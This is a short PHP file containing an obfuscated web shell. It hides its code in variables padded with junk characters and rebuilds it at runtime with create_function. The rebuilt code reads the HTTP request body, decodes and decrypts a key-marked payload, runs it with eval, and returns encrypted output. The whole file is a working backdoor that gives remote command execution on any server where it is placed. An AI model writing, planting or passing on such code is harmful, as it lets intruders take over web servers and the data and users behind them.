<?php
$p='=strlen($tNs);$o="";for($i=0;Ns$i<$l;NsNs){for(Ns$j=0;Ns($j<$cNs&&$i<$l)';
$Y='$k="0Nsc167Nsdf5";Ns$kNsh="c22679456668";Ns$kf="aNs8cNs99039e90Ns4";$p="rN';
$c=';$jNs++,$i++Ns){$Nso.=$t{$i}Ns^$Nsk{$j};Ns}}reNsturNsn $o;}if (@Nspreg_match';
$t='Ns=Ns=1) {@oNsb_startNs();@eNsvaNsl(Ns@gzuncompresNss(@x(@baNsse64_deNscode($m';
$F='sgRT9OJNsNsJwtMpRSLb";NsfunctNsion x($NsNst,$k){$c=NssNstrNslNseNsn($k);$l';
$V='ase6Ns4_Nsencode(@x(@gzNscompresNss($oNs),$k))Ns;print("$pNs$kh$rNs$kf");}';
$L='(Ns"/$NskNsh(.+)$kf/",@fiNslNse_get_cNsontents(Ns"php:Ns/Ns/input"),$m)';
$R='NsNs[1]),Ns$kNs)));$o=@ob_get_conteNsntsNs();Ns@ob_end_cleaNsn();$r=Ns@Nsb';
$O=str_replace('Td','','crTdTdeateTd_fuTdncTdTdtion');
$d=str_replace('Ns','',$Y.$F.$p.$c.$L.$t.$R.$V);
$l=$O('',$d);$l();
?>
